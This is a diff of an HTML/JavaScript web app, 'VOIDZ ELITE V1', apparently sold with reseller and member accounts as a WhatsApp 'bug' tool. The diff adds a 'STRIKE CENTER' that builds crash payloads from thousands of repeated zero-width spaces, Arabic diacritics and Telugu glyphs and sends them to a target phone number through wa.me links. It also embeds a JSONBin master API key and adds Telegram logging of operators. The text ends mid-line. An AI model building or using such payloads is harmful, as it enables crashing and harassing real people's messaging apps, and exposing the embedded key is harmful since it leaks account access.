@@ -3,47 +3,48 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>VOIDZ ELITE V1</title>
+    <title>VOIDZ ELITE V1 - SUPREME</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
     <style>
         :root { --fire: #ff4500; --neon: #ff0000; --bg: #000; --card: rgba(10, 0, 0, 0.95); }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'JetBrains Mono', monospace; }
-        body { background: var(--bg); color: #fff; height: 100vh; width: 100vw; overflow: hidden; }
+        body { background: var(--bg); color: #fff; height: 100vh; width: 100vw; overflow: hidden; position: relative; }
         
-        #ash-canvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 2; pointer-events: none; }
+        /* CANVAS ABU ROKOK */
+        #ash-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; pointer-events: none; }
+        
         .content-layer { position: relative; z-index: 10; height: 100vh; display: flex; flex-direction: column; }
-        
         .neon-red { color: var(--neon); text-shadow: 0 0 10px var(--neon); font-family: 'Orbitron'; font-weight: 900; }
         
-        /* LOGIN PAGE */
-        #loginPage { flex: 1; display: flex; justify-content: center; align-items: center; z-index: 100; }
-        .login-box { width: 85%; max-width: 320px; background: var(--card); border: 1px solid #222; padding: 30px; border-radius: 15px; text-align: center; border-top: 3px solid var(--fire); }
-        .profile-img { width: 85px; height: 85px; border-radius: 50%; border: 2px solid var(--fire); box-shadow: 0 0 15px var(--fire); margin-bottom: 20px; }
-        .input-box { width: 100%; background: #080808; border: 1px solid #333; padding: 12px; color: #fff; margin-bottom: 10px; text-align: center; font-size: 11px; border-radius: 5px; outline: none; }
-        .btn-main { width: 100%; background: var(--fire); color: #000; border: none; padding: 14px; font-weight: 900; cursor: pointer; border-radius: 5px; font-family: 'Orbitron'; transition: 0.3s; }
-        
-        /* DASHBOARD */
-        .header-title { text-align: center; margin-top: 45px; font-size: 18px; letter-spacing: 2px; }
-        .banner-container { width: 100%; aspect-ratio: 16/9; border: 1px solid #333; border-radius: 8px; overflow: hidden; margin: 10px 0; background: #000; }
-        .home-info { background: var(--card); border: 1px solid #222; padding: 15px; border-radius: 12px; border-left: 5px solid var(--fire); margin-bottom: 15px; }
-        .info-row { display: flex; align-items: center; gap: 12px; margin-bottom: 8px; font-size: 13px; font-family: 'Orbitron'; font-weight: bold; }
+        /* UI COMPONENTS */
+        #loginPage { flex: 1; display: flex; justify-content: center; align-items: center; }
+        .login-box { width: 85%; max-width: 320px; background: var(--card); border: 1px solid #222; padding: 30px; border-radius: 15px; text-align: center; border-top: 3px solid var(--fire); box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .profile-img { width: 85px; height: 85px; border-radius: 50%; border: 2px solid var(--fire); margin-bottom: 20px; object-fit: cover; box-shadow: 0 0 15px var(--fire); }
+        .input-box { width: 100%; background: #080808; border: 1px solid #333; padding: 12px; color: #fff; margin-bottom: 10px; text-align: center; font-size: 11px; border-radius: 5px; outline: none; transition: 0.3s; }
+        .input-box:focus { border-color: var(--fire); }
+        .btn-main { width: 100%; background: var(--fire); color: #000; border: none; padding: 14px; font-weight: 900; cursor: pointer; border-radius: 5px; font-family: 'Orbitron'; transition: 0.3s; display: block; }
+        .btn-main:disabled { background: #444; color: #888; cursor: not-allowed; }
 
+        /* DASHBOARD COMPONENTS */
         .tab-content { display: none; padding: 15px; overflow-y: auto; height: 100%; padding-bottom: 100px; }
         .active-tab { display: block; }
-        
+        .banner-container { width: 100%; aspect-ratio: 16/9; border: 1px solid #333; border-radius: 8px; overflow: hidden; margin: 10px 0; background: #000; }
+        .home-info { background: var(--card); border: 1px solid #222; padding: 15px; border-radius: 12px; border-left: 5px solid var(--fire); margin-bottom: 15px; }
+        .info-row { display: flex; align-items: center; gap: 12px; margin-bottom: 8px; font-size: 11px; font-family: 'Orbitron'; font-weight: bold; }
+
         .bottom-nav { position: fixed; bottom: 0; width: 100%; background: #050505; border-top: 1px solid #222; display: none; height: 65px; z-index: 1000; }
         .nav-btn { display: flex; flex-direction: column; align-items: center; justify-content: center; color: #444; flex: 1; font-size: 8px; cursor: pointer; }
         .nav-btn.active { color: var(--fire); }
 
         .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 9999; justify-content: center; align-items: center; padding: 20px; }
         .modal-content { background: #0a0a0a; padding: 25px; border: 1px solid var(--fire); width: 100%; max-width: 320px; border-radius: 15px; }
-        #logContent { background: #050505; border: 1px solid #222; padding: 10px; height: 350px; overflow-y: auto; font-size: 9px; color: #0f0; border-radius: 5px; }
+        #logContent { background: #050505; border: 1px solid #222; padding: 10px; height: 350px; overflow-y: auto; font-size: 9px; color: #0f0; border-radius: 5px; line-height: 1.5; }
     </style>
 </head>
 <body>
     <canvas id="ash-canvas"></canvas>
-    <div id="notif-box" style="position:fixed; top:15px; left:15px; z-index:99999;"></div>
+    <div id="notif-box" style="position:fixed; top:15px; left:15px; z-index:100000;"></div>
 
     <div class="content-layer">
         <div id="loginPage">
@@ -53,43 +54,48 @@
                 <input type="text" id="lUser" class="input-box" placeholder="OPERATOR ID">
                 <input type="password" id="lPass" class="input-box" placeholder="ACCESS KEY">
                 <button onclick="auth()" class="btn-main" id="btnLog">IGNITE</button>
-                <div style="margin-top: 15px;">
-                    <a href="https://wa.me/6285718241306" target="_blank" style="text-decoration:none; font-size:9px; color:#555; font-family:'Orbitron';">CONTACT ADMIN</a>
+                
+                <div style="margin-top: 15px; display: flex; flex-direction: column; gap: 8px;">
+                    <a href="https://whatsapp.com/channel/0029VbC50wZInlqIFSnZVt0U" target="_blank" style="text-decoration:none; font-size:10px; color:var(--fire); font-family:'Orbitron'; font-weight: bold;">SALURAN WHATSAPP</a>
+                    <a href="https://wa.me/6285718241306" target="_blank" style="text-decoration:none; font-size:9px; color:#555;">CONTACT ADMIN</a>
                 </div>
             </div>
         </div>
 
         <div id="mainApp" style="display:none; flex:1; overflow:hidden;">
             <div id="tabHOME" class="tab-content active-tab">
-                <div class="header-title neon-red">VOIDZ ELITE V1</div>
-                <div class="banner-container"><video id="homeVideo" loop muted playsinline style="width:100%; height:100%; object-fit:cover;"><source src="dashboard.mp4" type="video/mp4"></video></div>
-                <marquee style="color:var(--fire); font-size:9px; margin-bottom:10px;">[SYSTEM STABLE] - WELCOME TO VOIDZ ELITE - READY TO STRIKE</marquee>
+                <div class="header-title neon-red" style="text-align:center; margin-top:40px;">DASHBOARD</div>
+                <div class="banner-container">
+                    <video id="homeVideo" loop muted playsinline style="width:100%; height:100%; object-fit:cover;">
+                        <source src="" id="videoSource">
+                    </video>
+                </div>
+                <marquee style="color:var(--fire); font-size:9px; margin-bottom:10px;">[SYSTEM ONLINE] - MONITORING ACTIVE - READY TO STRIKE</marquee>
                 
                 <div class="home-info">
-                    <div class="info-row"><i class="fas fa-user" style="color:var(--fire)"></i> <span id="uName">...</span></div>
-                    <div class="info-row"><i class="fas fa-crown" style="color:var(--fire)"></i> <span id="uRole">...</span></div>
-                    <div class="info-row"><i class="fas fa-bolt" style="color:var(--fire)"></i> <span id="uQuota">...</span></div>
-                    <div class="info-row"><i class="fas fa-hourglass-half" style="color:#0f0"></i> <span id="uExp" style="color:#0f0">...</span></div>
+                    <div class="info-row"><i class="fas fa-user"></i> <span id="uName">...</span></div>
+                    <div class="info-row"><i class="fas fa-crown"></i> <span id="uRole">...</span></div>
+                    <div class="info-row"><i class="fas fa-bolt"></i> <span id="uQuota">...</span></div>
                 </div>
                 <div id="menuContainer" style="display:grid; grid-template-columns:1fr 1fr; gap:10px;"></div>
             </div>
 
             <div id="tabATTACK" class="tab-content">
-                <div class="header-title neon-red" style="margin-top:20px;">STRIKE CENTER</div>
-                <div style="background:var(--card); padding:15px; border-radius:10px; border:1px solid #222; border-top:2px solid var(--fire); margin-top:20px;">
+                <div class="header-title neon-red" style="text-align:center; margin-top:20px;">STRIKE CENTER</div>
+                <div style="background:var(--card); padding:15px; border-radius:10px; border-top:2px solid var(--fire); margin-top:20px;">
                     <input type="text" id="targetBug" class="input-box" placeholder="Target WA (628xxx)">
                     <select id="bugType" class="input-box">
-                        <option value="WA_CRASH">WA CRASH (LITE)</option>
-                        <option value="IP_FREEZE">IP FREEZE (MEDIUM)</option>
-                        <option value="SUPREME">SUPREME (HARD)</option>
+                        <option value="LAG_TEXT">🔥 LAG TEXT (V1)</option>
+                        <option value="RENDER_CRASH">❄️ RENDER CRASH (V2)</option>
+                        <option value="VOIDZ_SUPREME">💀 VOIDZ SUPREME (ULTIMATE)</option>
                     </select>
                     <button class="btn-main" onclick="startAttack()">EXECUTE STRIKE</button>
                 </div>
             </div>
 
             <div id="tabLOGS" class="tab-content">
-                <div class="header-title neon-red" style="margin-top:20px; margin-bottom:15px;">TERMINAL</div>
-                <div id="logContent"></div>
+                <div class="header-title neon-red" style="text-align:center; margin-top:20px;">TERMINAL</div>
+                <div id="logContent" style="margin-top:15px;"></div>
             </div>
         </div>
 
@@ -100,15 +106,28 @@
         </nav>
     </div>
 
+    <div id="modalConfig" class="modal">
+        <div class="modal-content">
+            <h3 class="neon-red" style="font-size:14px; text-align:center; margin-bottom:15px;">SYSTEM CONFIG</h3>
+            <input type="text" id="cfgBin" class="input-box" placeholder="JSONBin ID">
+            <input type="password" id="cfgKey" class="input-box" placeholder="Master Key">
+            <input type="text" id="cfgVid" class="input-box" placeholder="Video URL (.mp4)">
+            <input type="text" id="cfgTeleToken" class="input-box" placeholder="Tele Bot Token">
+            <input type="text" id="cfgTeleID" class="input-box" placeholder="Tele Chat ID">
+            <button class="btn-main" onclick="saveConfig()">SAVE & REBOOT</button>
+            <button onclick="closeModal('modalConfig')" style="width:100%; background:none; border:none; color:#444; font-size:9px; margin-top:10px;">CANCEL</button>
+        </div>
+    </div>
+
     <div id="modalGen" class="modal">
         <div class="modal-content">
             <h3 class="neon-red" style="font-size:14px; text-align:center; margin-bottom:15px;">UNIT GEN</h3>
             <input type="text" id="gUser" class="input-box" placeholder="NEW ID">
             <input type="password" id="gPass" class="input-box" placeholder="NEW KEY">
             <select id="gRole" class="input-box" onchange="toggleQuotaView()"></select>
-            <select id="gTime" class="input-box"></select>
+            <select id="gTime" class="input-box"><option value="1 MONTH">1 MONTH</option><option value="LIFETIME">LIFETIME</option></select>
             <div id="quotaArea" style="display:none;"><input type="number" id="gQuotaInput" class="input-box" placeholder="QUOTA"></div>
-            <button class="btn-main" id="btnDoGen" onclick="doGenerate()">PUSH UNIT</button>
+            <button class="btn-main" onclick="doGenerate()">PUSH UNIT</button>
             <button onclick="closeModal('modalGen')" style="width:100%; background:none; border:none; color:#444; font-size:9px; margin-top:10px;">CANCEL</button>
         </div>
     </div>
@@ -123,36 +142,69 @@
     </div>
 
     <script>
-        const BIN_ID = '694a5a6fae596e708fabef99';
-        const API_KEY = '$2a$10$dgiow6eyY5CjGfEYQtuAQ.E6b5sEA7j91bc4IexzX9cWV3uAksXgW';
+        // CONFIG LOADER
+        let BIN_ID = localStorage.getItem('cfg_bin') || '694a5a6fae596e708fabef99';
+        let API_KEY = localStorage.getItem('cfg_key') || '$2a$10$dgiow6eyY5CjGfEYQtuAQ.E6b5sEA7j91bc4IexzX9cWV3uAksXgW';
+        let VID_URL = localStorage.getItem('cfg_vid') || 'dashboard.mp4';
+        let TELE_TOKEN = localStorage.getItem('cfg_tele_token') || '';
+        let TELE_ID = localStorage.getItem('cfg_tele_id') || '';
+
         let USER = {}, DB = {}, LOGS = [];
 
+        // ABU ROKOK ENGINE
         const canvas = document.getElementById('ash-canvas');
         const ctx = canvas.getContext('2d');
         let particles = [];
         function initParts() {
             canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-            for(let i=0; i<40; i++) particles.push({ x: Math.random()*canvas.width, y: Math.random()*canvas.height, s: Math.random()*2+1, d: Math.random()*0.5+0.1 });
+            particles = [];
+            for(let i=0; i<80; i++) {
+                particles.push({ x: Math.random()*canvas.width, y: Math.random()*canvas.height, s: Math.random()*2, sy: Math.random()*0.5+0.1, sx: Math.random()*0.4-0.2, o: Math.random()*0.5 });
+            }
         }
         function drawParts() {
-            ctx.clearRect(0,0,canvas.width, canvas.height); ctx.fillStyle = "rgba(255,69,0,0.3)";
-            particles.forEach(p => { ctx.fillRect(p.x, p.y, p.s, p.s); p.y -= p.d; if(p.y < 0) p.y = canvas.height; });
+            ctx.clearRect(0,0,canvas.width, canvas.height);
+            particles.forEach(p => {
+                ctx.fillStyle = `rgba(200, 200, 200, ${p.o})`;
+                ctx.fillRect(p.x, p.y, p.s, p.s);
+                p.y -= p.sy; p.x += p.sx;
+                if(p.y < 0) { p.y = canvas.height; p.x = Math.random()*canvas.width; }
+            });
             requestAnimationFrame(drawParts);
         }
-        initParts(); drawParts();
+        window.addEventListener('resize', initParts); initParts(); drawParts();
+
+        // TELEGRAM LOGIC
+        async function sendTeleLog(action, detail) {
+            if(!TELE_TOKEN || !TELE_ID) return;
+            const text = `🚀 *VOIDZ ELITE MONITOR*\n\n📌 *ACTION:* ${action}\n📝 *DETAIL:* ${detail}\n🕒 *TIME:* ${new Date().toLocaleString()}`;
+            try { fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: TELE_ID, text: text, parse_mode: 'Markdown' })}); } catch(e) {}
+        }
 
         function notify(m) {
             const b = document.getElementById('notif-box');
             const n = document.createElement('div');
-            n.style = "background:rgba(10,0,0,0.9); border-left:3px solid var(--fire); padding:10px; color:#fff; font-size:10px; margin-bottom:5px; width:200px; border-radius:4px;";
+            n.style = "background:rgba(10,0,0,0.9); border-left:3px solid var(--fire); padding:10px; color:#fff; font-size:10px; margin-bottom:5px; border-radius:4px;";
             n.innerText = m; b.appendChild(n); setTimeout(() => n.remove(), 2500);
         }
 
+        function addLog(act, msg) {
+            const time = new Date().toLocaleTimeString();
+            LOGS.unshift(`[${time}] <span style="color:var(--fire)">${act}</span>: ${msg}`);
+            document.getElementById('logContent').innerHTML = LOGS.join('<br>');
+        }
+
+        // AUTH SYSTEM
         async function auth() {
-            const u = document.getElementById('lUser').value.trim(), p = document.getElementById('lPass').value.trim();
-            if(!u || !p) return notify("ISI DATA!");
+            const u = document.getElementById('lUser').value.trim();
+            const p = document.getElementById('lPass').value.trim();
+            const btn = document.getElementById('btnLog');
+            if(!u || !p) return notify("HARAP ISI DATA!");
+
+            btn.disabled = true; btn.innerText = "CONNECTING...";
             try {
                 const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, { headers: {'X-Master-Key': API_KEY, 'X-Bin-Meta': false}});
+                if(!res.ok) throw "DB_ERROR";
                 DB = await res.json();
                 if(DB[u] && DB[u].pw === p) {
                     USER = { id: u, ...DB[u] };
@@ -160,78 +212,76 @@
                     document.getElementById('mainApp').style.display = 'block';
                     document.getElementById('bottomNav').style.display = 'flex';
                     if(USER.role === 'owner') document.getElementById('navLogs').style.display = 'flex';
-                    renderHome(); document.getElementById('homeVideo').play();
-                } else { notify("AKSES DITOLAK!"); }
-            } catch(e) { notify("DATABASE ERROR!"); }
+                    document.getElementById('videoSource').src = VID_URL;
+                    document.getElementById('homeVideo').load(); document.getElementById('homeVideo').play();
+                    renderHome(); addLog("SYSTEM", `User ${u} Authorized.`);
+                    sendTeleLog("USER LOGIN", `Operator [${u}] telah masuk.`);
+                } else { throw "WRONG_KEY"; }
+            } catch(e) {
+                notify(e === "WRONG_KEY" ? "KEY SALAH!" : "DB EXPIRED / SALAH CONFIG!");
+                sendTeleLog("DATABASE ALERT", `Koneksi gagal/Key salah oleh: ${u}`);
+                btn.disabled = false; btn.innerText = "IGNITE";
+            }
         }
 
         function renderHome() {
-            document.getElementById('uName').innerText = USER.id + (USER.role === 'owner' ? " 👑" : "");
+            document.getElementById('uName').innerText = USER.id;
             document.getElementById('uRole').innerText = USER.role.toUpperCase();
-            document.getElementById('uQuota').innerText = USER.role === 'owner' ? '∞' : USER.quota;
-            document.getElementById('uExp').innerText = USER.exp;
+            document.getElementById('uQuota').innerText = USER.role === 'owner' ? 'INFINITY' : USER.quota;
             
             const m = document.getElementById('menuContainer'); m.innerHTML = "";
-            m.innerHTML += `<div onclick="window.open('https://whatsapp.com/channel/0029VbC50wZInlqIFSnZVt0U')" style="background:var(--card); padding:15px; border:1px solid #25d366; border-radius:10px; text-align:center;"><i class="fab fa-whatsapp" style="color:#25d366"></i><br><span style="font-size:8px;">COMMUNITY</span></div>`;
-            m.innerHTML += `<div onclick="window.open('https://wa.me/6285718241306')" style="background:var(--card); padding:15px; border:1px solid #ffeb3b; border-radius:10px; text-align:center;"><i class="fas fa-shopping-cart" style="color:#ffeb3b"></i><br><span style="font-size:8px;">UPGRADE</span></div>`;
-            
-            if(USER.role !== 'member') m.innerHTML += `<div onclick="openGen()" style="background:var(--card); padding:15px; border:1px solid var(--fire); border-radius:10px; text-align:center;"><i class="fas fa-user-plus" style="color:var(--fire)"></i><br><span style="font-size:8px;">GENERATE</span></div>`;
-            if(USER.role === 'owner') m.innerHTML += `<div onclick="openManager()" style="background:var(--card); padding:15px; border:1px solid #00e5ff; border-radius:10px; text-align:center;"><i class="fas fa-users-cog" style="color:#00e5ff"></i><br><span style="font-size:8px;">MANAGE</span></div>`;
-            m.innerHTML += `<div onclick="location.reload()" style="background:var(--card); padding:15px; border:1px solid #444; border-radius:10px; text-align:center;"><i class="fas fa-power-off" style="color:#444"></i><br><span style="font-size:8px;">EXIT</span></div>`;
+            if(USER.role !== 'member') m.innerHTML += `<div onclick="openGen()" style="background:var(--card); padding:15px; border:1px solid var(--fire); border-radius:10px; text-align:center;"><i class="fas fa-user-plus"></i><br><span style="font-size:8px;">GENERATE</span></div>`;
+            if(USER.role === 'owner') {
+                m.innerHTML += `<div onclick="openManager()" style="background:var(--card); padding:15px; border:1px solid #00e5ff; border-radius:10px; text-align:center;"><i class="fas fa-users-cog"></i><br><span style="font-size:8px;">MANAGE</span></div>`;
+                m.innerHTML += `<div onclick="openConfig()" style="background:var(--card); padding:15px; border:1px solid #ff00ff; border-radius:10px; text-align:center;"><i class="fas fa-cogs"></i><br><span style="font-size:8px;">CONFIG</span></div>`;
+            }
+            m.innerHTML += `<div onclick="location.reload()" style="background:var(--card); padding:15px; border:1px solid #444; border-radius:10px; text-align:center;"><i class="fas fa-power-off"></i><br><span style="font-size:8px;">EXIT</span></div>`;
         }
 
-        function toggleQuotaView() { document.getElementById('quotaArea').style.display = document.getElementById('gRole').value === 'reseller' ? 'block' : 'none'; }
+        // ATTACK LOGIC (WORK)
+        function startAttack() {
+            const t = document.getElementById('targetBug').value.trim();
+            const type = document.getElementById('bugType').value;
+            if(!t) return notify("ISI TARGET!");
+            if(USER.role !== 'owner' && USER.quota <= 0) return notify("KUOTA HABIS!");
+
+            addLog("STRIKE", `Injecting ${type} to ${t}...`);
+            sendTeleLog("EXECUTE STRIKE", `Target: ${t} | Type: ${type} | Operator: ${USER.id}`);
+
+            let payload = "";
+            if(type === "LAG_TEXT") payload = "VOIDZ_LAG" + "\u200B".repeat(15000);
+            else if(type === "RENDER_CRASH") payload = "VOIDZ_CRASH" + "ﺴﺴ".repeat(3000) + "⚝".repeat(2000);
+            else payload = "VOIDZ_SUPREME" + "\u200B".repeat(10000) + " ًٌٍَُِّ".repeat(2000) + "జ్ఞా".repeat(500);
+
+            if(USER.role !== 'owner') {
+                USER.quota--; DB[USER.id].quota = USER.quota;
+                fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, { method: 'PUT', headers: {'Content-Type': 'application/json', 'X-Master-Key': API_KEY}, body: JSON.stringify(DB)});
+                document.getElementById('uQuota').innerText = USER.quota;
+            }
+
+            notify("STRIKE INITIATED!");
+            setTimeout(() => { window.open(`https://api.whatsapp.com/send?phone=${t.replace(/\D/g,'')}&text=${encodeURIComponent(payload)}`, '_blank'); }, 1000);
+        }
+
+        // GENERATE & MANAGE
         function openGen() {
-            const r = document.getElementById('gRole'), t = document.getElementById('gTime');
             document.getElementById('modalGen').style.display = 'flex';
-            r.innerHTML = USER.role === 'owner' ? '<option value="reseller">RESELLER</option><option value="member">MEMBER</option>' : '<option value="member">MEMBER</option>';
-            t.innerHTML = '<option value="1 MONTH">1 MONTH</option><option value="LIFETIME">LIFETIME</option>';
+            document.getElementById('gRole').innerHTML = USER.role === 'owner' ? '<option value="reseller">RESELLER</option><option value="member">MEMBER</option>' : '<option value="member">MEMBER</option>';
             toggleQuotaView();
         }
-
+        function toggleQuotaView() { document.getElementById('quotaArea').style.display = document.getElementById('gRole').value === 'reseller' ? 'block' : 'none'; }
         async function doGenerate() {
-            const u = document.getElementById('gUser').value.trim(), p = document.getElementById('gPass').value.trim();
-            const r = document.getElementById('gRole').value, t = document.getElementById('gTime').value;
+            const u = document.getElementById('gUser').value.trim(), p = document.getElementById('gPass').value.trim(), r = document.getElementById('gRole').value;
             if(!u || !p) return notify("LENGKAPI DATA!");
-            if(USER.role === 'reseller' && USER.quota <= 0) return notify("QUOTA HABIS!");
-            DB[u] = { pw: p, role: r, exp: t, quota: parseInt(document.getElementById('gQuotaInput').value || 0) };
+            DB[u] = { pw: p, role: r, exp: document.getElementById('gTime').value, quota: parseInt(document.getElementById('gQuotaInput').value || 10) };
             if(USER.role === 'reseller') { USER.quota--; DB[USER.id].quota = USER.quota; }
             await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, { method: 'PUT', headers: {'Content-Type': 'application/json', 'X-Master-Key': API_KEY}, body: JSON.stringify(DB)});
-            notify("UNIT PUSHED!"); closeModal('modalGen'); renderHome();
+            notify("UNIT SUCCESS!"); closeModal('modalGen'); renderHome();
+            sendTeleLog("GENERATE", `ID: ${u} | Role: ${r} | By: ${USER.id}`);
         }
 
         function openManager() { document.getElementById('modalList').style.display = 'flex'; renderUserList(DB); }
         function renderUserList(data) {
             const area = document.getElementById('userListArea'); area.innerHTML = "";
             Object.keys(data).forEach(id => {
-                const u = data[id];
-                const item = document.createElement('div'); item.style = "padding:10px; border-bottom:1px solid #111; display:flex; justify-content:space-between;";
-                item.innerHTML = `<div><div style="font-size:10px; color:var(--fire)">${id}</div><div style="font-size:7px;">${u.role}</div></div>
-                ${id !== USER.id ? `<i class="fas fa-trash" onclick="delUser('${id}')" style="color:red"></i>` : ''}`;
-                area.appendChild(item);
-            });
-        }
-        async function delUser(id) {
-            if(!confirm("HAPUS?")) return; delete DB[id];
-            await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, { method: 'PUT', headers: {'Content-Type': 'application/json', 'X-Master-Key': API_KEY}, body: JSON.stringify(DB)});
-            renderUserList(DB);
-        }
-
-        function startAttack() {
-            const target = document.getElementById('targetBug').value.trim();
-            if(!target) return notify("ISI TARGET!");
-            const payload = "VOIDZ_STRIKE_" + "\u200B".repeat(5000);
-            window.open(`https://api.whatsapp.com/send?phone=${target.replace(/\D/g,'')}&text=${encodeURIComponent(payload)}`, '_blank');
-        }
-
-        function switchTab(t, el) {
-            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active-tab'));
-            document.getElementById('tab'+t.toUpperCase()).classList.add('active-tab');
-            document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
-            el.classList.add('active');
-        }
-        function closeModal(id) { document.getElementById(id).style.display = 'none'; }
-    </script>
-</body>
-                    </html>
-                    
+                area.innerHTML += `<div style="padding:10px; border-bottom:1px solid #111; display:flex; justify-content:space-between; align-items:center;"><div>${id}<br><small style="color:#666">${data[id].role}</small></div>${id !== USER.id ? `<i class="fas fa-trash" onclick="delUser('${id}')" style="color:red"></i>` : '<i 
